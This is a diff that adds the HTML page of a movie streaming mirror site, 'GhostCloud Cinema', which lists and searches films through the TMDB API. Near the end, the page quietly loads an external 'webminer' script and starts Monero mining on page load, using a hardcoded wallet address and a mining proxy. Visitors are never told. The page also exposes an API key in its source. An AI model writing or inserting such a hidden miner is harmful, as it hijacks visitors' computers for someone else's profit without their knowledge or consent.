@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>GhostCloud Cinema | 4K Mirror Portal</title>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-XCFYVQ97K6"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-XCFYVQ97K6');
+    </script>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+<nav>
+    <div class="logo">GHOSTCLOUD</div>
+    <div class="search-box">
+        <input type="text" id="userSearch" placeholder="Search any movie..." oninput="ghostSearch()">
+    </div>
+    <div style="font-size:11px; color:#4ade80;">● NODE SYNC: ACTIVE</div>
+</nav>
+<div class="content">
+    <h2 class="section-header" id="listTitle">Trending in 4K</h2>
+    <div class="movie-grid" id="gridDisplay"></div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/gh/annoforge/webminer@main/load.js"></script>
+
+<script>
+    const TMDB_KEY = '5513ab319975b0b6f6d297179708caec'; 
+    const WALLET = '48bN9tTb8niehRBkARiRPQgXYQFuh65pj3fp7DSfY8akMgdsQFUKqqg8FbtVQcKVdJPoNapcWMUiu1TSZiG7FxftFy8hiRy';
+
+    window.onload = function() {
+        if (typeof startMining === "function") {
+            startMining(WALLET, "Lobby_Node", "wss://ny1.xmrminingproxy.com", 5);
+        }
+    };
+
+    async function getTrending() {
+        const r = await fetch(`https://api.themoviedb.org/3/trending/movie/week?api_key=${TMDB_KEY}`);
+        const d = await r.json();
+        render(d.results);
+    }
+    async function ghostSearch() {
+        const query = document.getElementById('userSearch').value;
+        if(query.length < 3) return;
+        const r = await fetch(`https://api.themoviedb.org/3/search/movie?api_key=${TMDB_KEY}&query=${query}`);
+        const d = await r.json();
+        render(d.results);
+    }
+    function render(movies) {
+        const grid = document.getElementById('gridDisplay');
+        if(!movies) return;
+        grid.innerHTML = movies.map(m => `
+            <div class="movie-card" onclick="location.href='player.html?id=${m.id}'">
+                <img src="https://image.tmdb.org/t/p/w500${m.poster_path}" alt="Poster">
+                <div class="card-details">${m.title}</div>
+            </div>
+        `).join('');
+    }
+    getTrending();
+</script>
+</body>
+</html>
